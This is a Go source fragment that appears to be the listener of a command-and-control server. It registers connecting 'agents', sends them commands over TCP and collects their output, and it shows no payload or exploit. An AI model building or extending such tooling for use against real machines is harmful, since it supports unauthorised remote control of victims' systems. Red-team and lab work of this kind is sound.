package main

import (
	"bufio"
	"fmt"
	"net"
	"sync"
	"time"
)

// Global variables
var (
	agents  = make(map[int]*Agent) // ID -> Agent
	agentID = 0
	mu      sync.Mutex
)

type Agent struct {
	ID		int
	Conn	net.Conn
	IP		string
	InCmdChan chan string // Incoming commands
	OutCmdChan	chan string // Outgoing commands
	Done	chan bool 	
}

func handle_agent(conn net.Conn) {
	ip := conn.RemoteAddr().String()

	mu.Lock()
	id := agentID
	agentID++
	mu.Unlock()

	agent := &Agent {
		ID:			id,
		Conn:		conn,
		IP:			ip,
		InCmdChan: 	make(chan string),
		OutCmdChan:	make(chan string, 10), // Buffered to store multiple outputs
		Done:		make(chan bool),
	}

	mu.Lock()
	agents[id] = agent
	mu.Unlock()

	fmt.Printf("[+] Agent %d connected from %s\n", id, ip)
	
	defer func() {
		conn.Close()
		mu.Lock()
		delete(agents, id)
		mu.Unlock()
		fmt.Printf("[-] Agent %d disconnected\n", id)
	}()

	// Read from the TCP connection
	reader := bufio.NewReader(conn)

	for {
		select{
			case cmd := <- agent.InCmdChan:
				_, err := conn.Write([]byte(cmd+"\n"))
				if err != nil {
					return
				}

				conn.SetDeadline(time.Now().Add(30 * time.Second))
				
				output, err := reader.ReadString('\n')
				if err != nil {
					return
				}

				conn.SetReadDeadline(time.Time{})
				
				agent.OutCmdChan <- output

				case <- agent.Done:
					return
		}
	}
}